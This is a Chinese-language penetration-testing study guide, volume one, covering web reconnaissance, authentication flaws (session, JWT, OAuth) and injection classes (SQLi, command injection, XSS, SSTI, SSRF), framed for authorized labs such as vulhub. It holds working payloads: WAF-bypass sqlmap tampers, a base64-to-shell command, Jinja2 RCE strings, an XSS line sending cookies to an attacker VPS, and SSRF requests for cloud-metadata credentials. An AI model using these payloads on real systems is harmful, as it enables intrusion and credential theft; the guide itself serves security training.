# VOL-01 · Web 应用渗透（上）：侦察、指纹与注入类漏洞

> 读者：5 年代码审计/产品安全、刚转黑盒渗透的一人红队。本卷解决"从域名到可利用漏洞"的最短路径；越权、上传、反序列化、逻辑漏洞（见 VOL-02-web-app-part2），内网横向（见 VOL-03-intranet-pivot），报告交付（见 VOL-04-report-delivery）。所有靶场仅限本地 vulhub 与授权环境复现。

## 目录
1. 外部信息收集：子域 / 端口与指纹 / 目录爆破 / JS 提取
2. 攻击面建立：入口点清单、参数枚举、指纹→CVE
3. 认证机制分析：Session / JWT / OAuth
4. 注入类深讲：SQL 注入 / 命令注入 / XSS / SSTI / SSRF
5. 综合练习路线

## 1. 外部信息收集（Reconnaissance）

> 🧭 **导读**：你站在整条链路的最上游——手里只有一个授权域名，连一台活着的机器都还没确认。这一章只做“看”：审计时你拿到代码会先数 Controller 和路由，而不是一头扎进某个方法；这里同理，子域、端口、路径、JS 四节就是给目标“数路由”。
> 忍住别发 payload：第 2 节起的每一发弹药，都从这四张清单里出。

### 1.1 子域名收集（Subdomain Enumeration）：OneForAll / Amass

【原理】子域是打点的第一资产面，来源四类：①证书透明度（Certificate Transparency，CT）：CA 签发的证书必须公示，crt.sh 等可查；②被动 DNS（Passive DNS）：VirusTotal、SecurityTrails 等存档的历史解析；③暴力枚举（Brute Force）：字典前缀逐个发 DNS 查询，能解析即存在；④智能置换（Permutation）：对已知子域做 dev→dev2/prod-uat 变形再验证。OneForAll 把上述来源+爬虫归档整合为流水线；Amass（OWASP amass）数据源最多、带资产图谱数据库，适合长期维护。

【操作】
```bash
python3 oneforall.py --target example.com run    # 结果生成于 results/ 目录
amass enum -passive -d example.com -o a1.txt     # 被动：不碰目标、零告警
amass enum -active -d example.com -src -o a2.txt # 主动：含解析验证与爆破
cat a1.txt a2.txt | sort -u > subs.txt           # 合并去重
```
工具：<https://github.com/shmilylty/OneForAll>、<https://github.com/owasp-amass/amass>

【验证】`wc -l subs.txt` 看规模；抽查 `dig +short dev.example.com` 应返回 A 记录；两工具结果重叠度低是正常的（被动源互不相同）。

【陷阱】①泛解析（Wildcard DNS）：先 `dig +short rand9931.example.com`，若也能解析则爆破结果全是噪声，按"全部指向同一组 IP"的特征剔除；②CNAME 指向 CDN 时真实源站在后面，直扫 CDN 节点无意义（见 1.2 陷阱）；③CT 日志有延迟，刚上线的子域查不到。

### 1.2 端口与服务指纹：nmap 原理 + httpx

【原理】nmap 两种扫描：`-sS`（SYN 扫描）发 SYN，收到 SYN/ACK 即记 open 并回 RST，不完成三次握手，快且应用日志不可见，但需 root；`-sT`（CONNECT 扫描）走系统 connect() 完整建连，无需特权但慢、会被应用记录。服务探测（`-sV`）机制：内置 nmap-service-probes 探针库，按序发送 HTTP GET、SSL 握手等特定载荷，用数百条正则签名匹配响应推出 product/version，`--version-intensity` 控制探针激进程度。端口只是入口，服务版本才是"指纹→CVE"的输入。httpx 对 web 端口批量探测，取 title、状态码、技术栈（Wappalyzer 数据源）、CDN 归属。

【操作】
```bash
sudo nmap -sS -Pn -n --min-rate 3000 -p- 1.2.3.4 -oN ports.txt  # 全端口快扫
nmap -sV -sC -p 80,443,8080,8443 1.2.3.4 -oN svc.txt             # 版本+默认脚本
sudo nmap -sU --top-ports 20 1.2.3.4                             # UDP 高频口
cat subs.txt | httpx -title -sc -td -ip -cdn -silent -o web.txt  # 批量 Web 存活
```

【验证】nmap 输出形如 `80/tcp open http nginx 1.18.0`（端口/状态/服务/版本）；`filtered` 是被防火墙丢包≠无服务。httpx 逐行 `[URL] [200] [Nginx, PHP]`。

【陷阱】①扫到的是 CDN/高防 IP 时一切结论作废，先看 1.1 的 CNAME 与 -cdn 结果；②`-sV` 与 `--script=vuln` 探针会触发目标 IDS 告警，授权范围与静默要求先确认；③云安全组全 drop 时 SYN 全 filtered，换被动信息源别死磕。

### 1.3 目录爆破（Content Discovery）：ffuf / dirsearch

【原理】本质是"高频请求+按响应特征区分命中"，判据从粗到细：状态码→Content-Length→行数。两个关键机制：①自动校准（Auto-calibration，ffuf `-ac`）：先请求多个随机不存在路径，把共性响应（如自定义 404 返回 200、长度恒定）作为基线过滤，专治"全 200"站点；②递归（Recursion）：对命中目录再入一层爆破。字典决定上限，SecLists 的 Discovery/Web-Content/ 是事实标准。

【操作】
```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt \
  -u https://t.com/FUZZ -ac -t 50                    # 小字典先行
ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt \
  -u https://t.com/FUZZ -e .php,.jsp,.bak -recursion -recursion-depth 2 \
  -rate 150 -ac -o f.json -of json                   # 递归+扩展名+限速
dirsearch -u https://t.com -e php,jsp,html -r --max-recursion-depth 2
# 排除状态码等更多参数以官方文档为准：https://github.com/maurosoria/dirsearch
```

【验证】真实路径的响应长度会从基线中"跳出来"；对每个候选 `curl -i https://t.com/xxx` 人工复核——爆破器必误报，人工确认是纪律。

【陷阱】①只看状态码会被自定义 404 骗，先 `-ac`，再用 `-fs <基线长度>` 收紧；②高并发会打挂目标或触发 WAF 封 IP，授权项目先约定窗口并用 `-rate` 限速；③业务路径（/api/v2/user）不在通用字典里，靠 1.4 与第 2 节补；④高价值路径先手测：/.git/config、/.env、/actuator/heapdump、/swagger-ui.html。

### 1.4 JS 信息提取

【原理】前后端分离下，攻击面大半写死在前端 JS：未公开 API、云 AK/SK（AccessKey）、内网测试接口、隐藏功能开关。两条路：①归档历史 JS（wayback/OTX，用 gau 拉取）；②目标在线 JS 静态分析（LinkFinder 用正则抽端点）。source map（.map 文件）未删除则可直接还原 TS 源码。

【操作】
```bash
gau t.com | grep -E '\.js($|\?)' | sort -u > js.txt
python3 linkfinder.py -i https://t.com -d -o cli > eps.txt  # -d 深挖整域
grep -hE '(accessKey|secret|token|api[_-]?key|password)[" ]*[:=]' *.js | sort -u
grep -rh sourceMappingURL *.js                              # 检查 .map 泄露
```

【验证】eps.txt 出现字典之外的 /api/ 路径；.map 文件 sources 字段列出原始源码文件名。

【陷阱】①混淆 JS 先在 DevTools 里 pretty-print 再分析；②前端公开 key（如地图 appid）≠凭据，先甄别再上报；③归档里的接口可能已下线，用 httpx 复测存活。

【练习·第 1 节】对下列每个 vulhub 靶机（`cd vulhub/<组件> && docker compose up -d`，`docker ps` 拿 IP）完整跑一遍"nmap→httpx→ffuf→JS 提取"流水线；再刷 HTB 退役机 Shocker（easy）、Nibbles（easy，指纹→公开漏洞全链路）。

## 2. 攻击面建立

> 🧭 **导读**：路到这里换挡——前一章你只在场外“看”，从这章起第一次出手验证，从“知道它存在”走到“确认它打得通”。
> 钥匙攥在 1.3/1.4 的产出里：字典翻不出的业务路径、JS 里抽到的隐藏端点，都会在这里汇成一本底账；这本账要陪你走完第 3、4 章，值得慢下来记整齐。

【原理】信息收集要收敛为一张"入口点清单"：每行 = URL+方法+参数+认证要求，这是后续所有测试的底账。链路：资产→端口→入口→技术栈指纹→组件版本→CVE/公开 POC→验证。审计期的"fingerprint→CVE"直觉完全适用，只是输入从 pom.xml 换成响应头、报错页、cookie 名、favicon（favicon hash 可在 Shodan 反查同图标资产）。

【操作】①清点：Burp 手动浏览全站，Target→Sitemap 即底账；重点找 swagger/openapi、/graphql（introspection）、actuator。②隐藏参数枚举：Arjun 用响应差异探测前端已删但后端仍读的参数：`arjun -u https://t.com/api/user`（参数以官方 README 为准：<https://github.com/s0md3v/Arjun>）。③指纹与已知漏洞：
```bash
whatweb https://t.com                        # 技术栈
httpx -l urls.txt -td                        # 批量
searchsploit thinkphp 5                      # 版本→公开 exploit
searchsploit -m php/webapps/46xxx.txt        # 取回本地验证
```

【验证】产出表格：入口 | 参数 | 指纹 | 候选 CVE | 验证状态；searchsploit 命中会给出 exploit 相对路径。

【陷阱】①指纹≠版本：见到 Spring Boot actuator 不等于 Spring4Shell（CVE-2022-22965）可打，须逐条核对利用条件（JDK9+、war 部署等）；②WAF 吞掉 POC 响应会制造"打不通"假象，先用版本探测端点（如 /actuator/info）确认组件再下结论；③未授权接口本身就是高危（越权访问 Broken Access Control，见 VOL-02）。

【练习·第 2 节】vulhub/struts2/s2-045（.action 指纹→CVE-2017-5638）、vulhub/thinkphp/5-rce（报错页指纹→公开 POC）：先只凭指纹判版本，再用 searchsploit 找 exploit 复现，体会"指纹→CVE→验证"闭环。

## 3. 认证机制分析

> 🧭 **导读**：别把这章当两场硬仗之间的支线——对刚转黑盒的你，门锁常比注入好撬：审计期你见过的那些“鉴权一行注释掉”式事故，黑盒里就藏在这三节。
> 带上第 2 章底账里标“需登录”的入口当靶子，先翻钥匙，再去打第 4 章的硬仗；3.2 的尾巴埋了根线，第 4 章的 XSS 会回来接上。

### 3.1 会话（Session）
【原理】安全前提两个：ID 不可预测+服务端正确失效。常见缺陷：①ID 可预测（自增/时间戳+弱随机）；②登出、改密后旧 session 不失效；③会话固定（Session Fixation）：登录前后 cookie 不轮换；④cookie 缺 Secure/HttpOnly/SameSite 属性。
【操作】注册两个账号抓 Set-Cookie；Burp Comparer 对比多个 session 值找结构规律（长度、字符集、分段）；登出后用旧 cookie 在 Repeater 重放关键请求。
【验证】旧 cookie 仍返回 200 且为登录态→"未失效"实锤；cookie 中出现 `user=1001` 类自增段→可预测。
【陷阱】分布式 session（Redis 共享）下"退出重登"可能复用同 ID，区分复用与固定；改密必须全端失效，只测浏览器端不够。

### 3.2 JWT（JSON Web Token）
【原理】结构 base64url(header).payload.signature。缺陷五连：①服务端不验签名（改 payload 即越权，见 VOL-02）；②`alg=none`：旧库接受无签名令牌；③HS256 弱密钥可字典爆破；④算法混淆（Algorithm Confusion，RS256→HS256）：拿公钥当 HMAC 密钥重签；⑤kid 参数注入（SQLi/路径遍历取 key）。
【操作】
```bash
echo 'eyJhbGciOi...' | tr '-_' '/+' | base64 -d 2>/dev/null  # 解码 header/payload
echo 'eyJhbGciOi...' > jwt.txt
hashcat -m 16500 jwt.txt rockyou.txt                         # 爆破弱 HMAC 密钥
python3 jwt_tool.py <TOKEN> -X a                             # alg=none 攻击
python3 jwt_tool.py <TOKEN> -T                               # 篡改重签
```
（jwt_tool：<https://github.com/ticarpi/jwt_tool>）
【验证】篡改 sub/role 后仍非 401/403→签名校验缺失；hashcat 输出 `Recovered.Key: secret123`。
【陷阱】base64url 与标准 base64 差在 `-_` 与无 padding，解码先 tr；拿公钥重签需先从 /.well-known/jwks.json 取公钥本体；JWT 存 localStorage 时与 XSS（4.3）联动打。

### 3.3 OAuth 2.0 / OIDC
【原理】授权码模式（Authorization Code）的安全依赖：redirect_uri 严格白名单、code 一次性短时效、state 防 CSRF。常见缺陷：①redirect_uri 校验宽→code 被劫持；②code 可重放；③implicit 模式 token 暴露于 URL fragment；④缺 state→登录 CSRF。
【操作】Burp 完整走一遍三方登录，标记四个请求：跳转授权、带 code 回调、code 换 token、userinfo。逐项改：redirect_uri 换自有域名/子路径/URL 编码变体；把用过的 code 原样重发。
【验证】回调域名改到攻击者域仍 302 通过→redirect_uri 校验缺陷（常伴开放重定向 Open Redirect）；code 二次使用仍 200→可重放。
【陷阱】redirect_uri 校验常是"包含"匹配而非全等，试 URL 编码、大小写、加子目录、@；token 在 fragment 里服务端日志不记，但前端 JS 可读，须与 XSS 一并评估。

【练习·第 3 节】JWT/OAuth 深练用 PortSwigger Web Security Academy 的 JWT 与 OAuth 主题 lab（免费、带官方解法：<https://portswigger.net/web-security>）；弱口令与认证绕过：vulhub/tomcat/tomcat8（Tomcat 管理台弱口令→deploy war）、vulhub/mysql/CVE-2012-2122（认证比较缺陷，多次连接绕过密码）。

## 4. 注入类漏洞

> 🧭 **导读**：本卷最硬的一章，但路是一条直线：五个注入是同一种病——数据被当成代码——换了五处战场，从数据库、操作系统一路打到别人的浏览器、模板引擎、内网。
> SQL 注入排头不是随机，它把“怎么观察、怎么选打法”的基本功练全，后面四节都在复用这套手感；走到 SSRF 收尾，你已站在内网门口——那是 VOL-03 的地界。

### 4.1 SQL 注入（SQL Injection）

【原理】根因是拼接（你已熟），黑盒差异在"观察通道"：①联合注入（UNION-based）：额外 SELECT 并入响应，回显最直接；②报错注入（Error-based）：用 updatexml/extractvalue 把数据挤进报错页；③布尔盲注（Boolean-based Blind）：页面只有真/假两态，逐位猜解；④时间盲注（Time-based Blind）：连形态都没有，用延迟做信号；⑤堆叠注入（Stacked Queries）：一次提交多条语句，取决于驱动是否允许 multi-statement。三库差异要点：MySQL——information_schema、LIMIT 偏移、updatexml 报错、默认禁堆叠（PHP mysqli 单语句、PDO 默认关多句）；PostgreSQL——`||` 拼接、pg_sleep、pg_read_file、天然支持堆叠；MSSQL——WAITFOR DELAY 延时、xp_cmdshell 执行命令、堆叠支持好。

【操作】手工五步（数字型 `?id=1` 为例）：
```
1'                         → 报错/渲染异常，判定注入
1 ORDER BY 5-- -           → 递减试列数，临界报错即列数
1 UNION SELECT 1,2,3-- -   → 找回显位
1 UNION SELECT version(),database(),user()-- -    → 回显位取系统信息
1 UNION SELECT table_name,2,3 FROM information_schema.tables
 WHERE table_schema=database()-- -                → 逐层取表取列
```
报错与时间通道（三库对照）：
```
MySQL:      1 AND updatexml(1,concat(0x7e,(SELECT user())),1)
MySQL:      1 AND SLEEP(5)
PostgreSQL: 1;SELECT pg_sleep(5)--
MSSQL:      1;WAITFOR DELAY '0:0:5'--
```
sqlmap 配合（手工定位注入点后交它提数据）：
```bash
sqlmap -r req.txt --batch --dbms=mysql --dbs     # -r 用 Burp 保存的原始请求
sqlmap -r req.txt -D webapp -T users --dump
sqlmap -r req.txt --technique=BT --time-sec=8    # 盲注指定通道、加长基线
sqlmap -r req.txt --level=3 --risk=2             # 探测 Cookie/头注入点
sqlmap -r req.txt --tamper=space2comment,between # WAF 绕过
```
bypass 思路：①关键字拦截→MySQL 版本注释 `/*!50000SELECT*/`、大小写混合、双重 URL 编码；②空格拦截→`%09`、`%0a`、`/**/` 替代；③语义等价→`=` 换 `like`、`AND 1=1` 换 `&&true`；④云 WAF 特征强时换时间盲注通道+`--random-agent` 降速伪装正常流量。

【验证】UNION 回显位出现 database() 值；报错注入页面出现 `XPATH syntax error: '~root@localhost'`；时间注入响应稳定 +5s（对照正常请求三次取基线，排除网络抖动）；sqlmap 输出 back-end DBMS 为 MySQL 并逐表 dump。

【陷阱】①字符型先试对引号闭合，闭合错全盘白搭；②WAF 拦截导致 sqlmap 假阴性，先手工确认存在再调 tamper；③大表别直接 --dump，先 --count，避免打挂客户库；④MySQL+PHP 下堆叠几乎全灭，别死磕，换 UNION/盲注；⑤--os-shell 依赖堆叠或文件写权限，MySQL 常被 secure_file_priv=NULL 卡死。

【练习·4.1】vulhub/discuz/wooyun-2010-080723（Discuz 7.2 GET 注入：手工五步+sqlmap 复跑）；布尔/时间盲注练 sqli-labs less-8/less-9（GitHub 开源）；PortSwigger SQL injection 全系列 lab 补 payload 内功。

### 4.2 命令注入（OS Command Injection）

【原理】输入被拼进 shell 命令（system/popen/sh -c）。分隔符：`;` 顺执、`|` 管道取后者输出、`&&` 前真后执、反引号与 `$()` 命令替换。无回显用带外验证（Out-of-Band，OOB）：让目标主动发起 DNS/HTTP 打点。你熟的 Java 细节黑盒同样有用：Runtime.exec() 不经 shell 解析，`;`/`|` 全失效，只能做参数注入（如 curl 的 -o、tar 的 --checkpoint）。
【操作】
```
ping 参数值: 127.0.0.1;id              → 看多出的 uid= 输出
127.0.0.1 | whoami                     → 管道取回显
127.0.0.1 && curl http://x.dnslog.cn   → 无回显时 OOB 打点
空格被过滤: {cat,/etc/passwd} 或 ${IFS}
```
【验证】响应出现第二命令输出；dnslog 平台收到解析记录（有秒级延迟，刷新）。
【陷阱】①WAF 杀命令关键词用 base64：`echo aWQ=|base64 -d|sh`；②无回显≠无洞，必须 OOB 或 `sleep 5` 延迟验证；③出网被禁时时间差是唯一通道，多次对照。
【练习·4.2】vulhub/bash/CVE-2014-6271（Shellshock：环境变量注入命令）、vulhub/gitlist/CVE-2018-1000533（gitlist 命令注入）；DVWA Command Injection 模块低→高难度逐级。

### 4.3 XSS（跨站脚本，Cross-Site Scripting）

【原理】三类：存储型（Stored）payload 入库、他人访问即触发，主打后台管理员，价值最高；反射型（Reflected）在 URL 中需诱导点击；DOM 型纯前端 source→sink（innerHTML/document.write/eval），请求不过服务器、WAF 看不见。实战利用边界（授权内）：窃取 cookie（受 HttpOnly 限制）、以受害者身份发业务请求（转账/改绑）、钓鱼表单、借浏览器做内网探测。
【操作】渐进探测：
```
<x>1</x>                          → 回显原样：未编码
&lt;x&gt;                         → 已 HTML 编码：换属性/JS 上下文
<img src=x onerror=alert(1)>      → 事件注入
" onfocus=alert(1) autofocus="    → 双引号属性逃逸
</script><script>alert(1)</script> → JS 字符串闭合
```
DOM 型在 DevTools Sources 对 sink 下断点看 source 数据流；数据外带：payload 中 `fetch('https://your.vps/?c='+document.cookie)`，VPS 上 `python3 -m http.server 80` 收日志。
【验证】alert 只是"证明"，实战验证看 VPS 日志收到 cookie/页面数据。
【陷阱】①HttpOnly 打不掉 cookie，转打 DOM 中可读的 CSRF token 或直接让 JS 发业务请求；②CSP（Content-Security-Policy）会拦外带，先读响应头评估；③存储型优先注入"仅管理员可见"字段（工单备注/审计页）等待触发；④客户环境弹 alert 截图即止，勿挂真实恶意 payload。
【练习·4.3】vulhub 无 XSS 专项（以仓库目录为准），用 PortSwigger Web Security Academy 的 Cross-site scripting 全系列 + DVWA/bWAPP XSS 模块。

### 4.4 SSTI（服务端模板注入，Server-Side Template Injection）

【原理】输入被当模板渲染而非数据。两步检测：①发 `${7*7}`、`{{7*7}}`、`<%= 7*7 %>`、`#{7*7}`，回显 49 即存在；②区分引擎：`{{7*'7'}}` 在 Jinja2 得 7777777（Python 字符串重复），在 Twig 得 49（数字转换）。Jinja2 的 RCE 靠模板全局对象链到 os 模块。
【操作】
```
{{7*7}}        → 49：存在 SSTI
{{7*'7'}}      → Jinja2:7777777 / Twig:49
# Jinja2 RCE 常见形式（依赖目标注入的模板全局，不通就换对象遍历）：
{{ lipsum.__globals__['os'].popen('id').read() }}
{{ cycler.__init__.__globals__.os.popen('id').read() }}
```
更多引擎 payload 查 HackTricks SSTI 速查表（<https://book.hacktricks.xyz>）。
【验证】回显命令输出；无回显用 `popen('curl x.dnslog.cn')` OOB 验证。
【陷阱】①`{{}}` 被过滤换 `{% if %}`/`{%print %}` 语句块；②payload 强依赖框架注入的全局对象（Flask 有 lipsum/cycler，纯 Jinja2 命令行没有）；③业务本身会算术时"49"会误判，用 `7*'7'` 复核；④WAF 拦 `__class__` 时用 attr 过滤器链变形。
【练习·4.4】vulhub/flask/ssti（Jinja2：从探测到 RCE 完整一遍）+ PortSwigger SSTI lab。

### 4.5 SSRF（服务端请求伪造，Server-Side Request Forgery）

【原理】服务端按用户指定 URL 发请求。直接危害：访问仅内网可达的服务与管理后台、读云元数据拿临时凭据；协议进阶：file:// 读文件、gopher:// 构造任意 TCP 报文打内网 Redis/FastCGI、dict:// 探端口。内网穿透意义：SSRF 是外网打点进入内网的第一跳——把"内网不可达"变成"经目标可达"，为横向移动（见 VOL-03-intranet-pivot）铺路。
【操作】
```
# 基础回连：VPS 上 python3 -m http.server 8000 看日志
url=http://<VPS>:8000/ssrf
# 探内网（用响应差异/报错信息判断端口开放）
url=http://127.0.0.1:6379/   url=http://192.168.0.1/   url=http://10.0.0.1/
# 云元数据（拿 AccessKey/临时凭据）
AWS:    http://169.254.169.254/latest/meta-data/iam/security-credentials/
阿里云: http://100.100.100.200/latest/meta-data/
# gopher 打 Redis（pip 安装 gopherus 后生成 payload）
gopherus --exploit redis
```
【验证】VPS 日志出现目标 IP 的 GET；元数据接口返回 AccessKeyId/Token；gopher 利用后 Redis 中出现写入的 key 或计划任务。
【陷阱】①过滤 127.0.0.1 时依次试：127.1、0177.0.0.1（八进制）、0x7f.1、[::1]、DNS 重绑定（Rebinding）；②302 跳转绕过校验：自有 VPS 302 到内网/file://，成败取决于服务端是否跟随跳转；③AWS IMDSv2 已强制 token，失败不代表无洞；④盲 SSRF 无响应内容，只能靠时间/长度差异+OOB 判定。
【练习·4.5】vulhub/weblogic/ssrf（经典：借 SSRF 探测内网结构）+ PortSwigger SSRF lab。

## 5. 综合练习路线

一周节奏：D1–D2 本地 vulhub 把本卷各节靶机全打一遍并截图留档；D3 用 HTB Shocker/Nibbles 复盘"侦察→指纹→利用→提权"全链路；D4–D5 PortSwigger SQLi/XSS/SSTI/SSRF lab 补手工 payload 内功；D6–D7 把每个洞按"原理/复现步骤/影响面/修复建议"四段写成报告（交付模板见 VOL-04-report-delivery）。工具不确定的参数一律 `--help` 或官方文档核实；本卷命令已对官方仓库核验，个别标注"以官方文档为准"处请自行复核。
